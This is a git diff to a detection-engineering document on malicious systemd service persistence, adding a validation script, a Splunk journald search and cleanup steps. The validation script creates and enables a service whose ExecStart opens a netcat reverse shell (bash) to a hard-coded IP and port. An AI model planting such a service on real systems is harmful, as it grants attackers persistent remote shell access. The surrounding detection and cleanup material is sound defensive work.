@@ -45,6 +45,7 @@ This alert may cause false positives for systems running the GNOME Desktop Envir
 
 ## Validation
 
+### Validating the Detection
 Validation can be performed by executing the provided shell script to generate a systemd service in the /etc/systemd/system directory.
 
 ```bash
@@ -53,21 +54,43 @@ echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/sys-te
 echo "" >> /etc/systemd/system/sys-temd-agent.service
 echo "[Service]" >> /etc/systemd/system/sys-temd-agent.service
 echo "Type=simple"
-echo "ExecStart=#{execstart_action}" >> /etc/systemd/system/sys-temd-agent.service
-echo "ExecStartPre=#{execstartpre_action}" >> /etc/systemd/system/sys-temd-agent.service
-echo "ExecStartPost=#{execstartpost_action}" >> /etc/systemd/system/sys-temd-agent.service
-echo "ExecReload=#{execreload_action}" >> /etc/systemd/system/sys-temd-agent.service
-echo "ExecStop=#{execstop_action}" >> /etc/systemd/system/sys-temd-agent.service
-echo "ExecStopPost=#{execstoppost_action}" >> /etc/systemd/system/sys-temd-agent.service
+echo "ExecStart=nc -e /bin/bash 192.168.100.191 9001" >> /etc/systemd/system/sys-temd-agent.service
+echo "ExecStop=echo haha youve been pwned" >> /etc/systemd/system/sys-temd-agent.service
 echo "" >> /etc/systemd/system/sys-temd-agent.service
 echo "[Install]" >> /etc/systemd/system/sys-temd-agent.service
-echo "WantedBy=default.target" >> /etc/systemd/system/sys-temd-agent.service
+echo "WantedBy=graphical.target" >> /etc/systemd/system/sys-temd-agent.service
 systemctl daemon-reload
 systemctl enable sys-temd-agent.service
 systemctl start sys-temd-agent.service
 ```
 
 The detection should alert on the generated systemd service.
+
+An example detection alerts on the folowing search in Splunk: 
+
+```
+host="rocky-detection-test" sourcetype="journald" sys-temd-agent.service
+```
+
+This search will alert every time the sys-temd-agent.service string appears in the journald log, so it is quite noisy right now.
+
+> Note:
+> For this example search to work, a Splunk Universal Forwarder must be configured to ship journald logs on the target system to Splunk. Additionally, threat detection engineers should adapt the "host" and "sourcetype" fields to their environment. The "host" field pulls from the target system's hostname. "rocky-detection-test" is probably not valid in your environment.
+
+### Cleanup
+
+Detection engineers may clean up from validating the detection against their environment by doing the following steps:
+
+On the test system:
+1. Disable the sys-temd-agent.service using `systemctl` 
+2. Remove the sys-temd-agent.service file from the filesystem
+3. Execute `systemctl daemon-reload` to tell systemd that the services defined on the system have changed.
+4. If it was set up for this test, remove the Splunk Universal Forwarder from the system (Using the RPM package, it will be installed in the `/opt/splunkforwarder` directory by default).
+
+On the Splunk instance:
+1. Remove any alerts defined in the Search and Reporting app
+2. If it was set up specifically for this test, remove the receiving rule from Settings > Forwarding and receiving > Configure receiving 
+3. If a separate index was used for this test, remove the index from your Splunk Enterprise or Splunk Cloud environment.
 
 ## Priority
 
@@ -97,3 +120,5 @@ DELETE BEFORE SUBMISSION: [GitHub Markdown Reference ](https://docs.github.com/e
 [^4]: [RotaJakiro: A long live secret backdoor with 0 VT detection](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)
 
 [^5]: [Backdoor.Linux.ROTAJAKIRO.A](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.linux.rotajakiro.a/) 
+
+[]: [Palantir ADS Framework Blog Post](https://blog.palantir.com/alerting-and-detection-strategy-framework-52dc33722df2) 
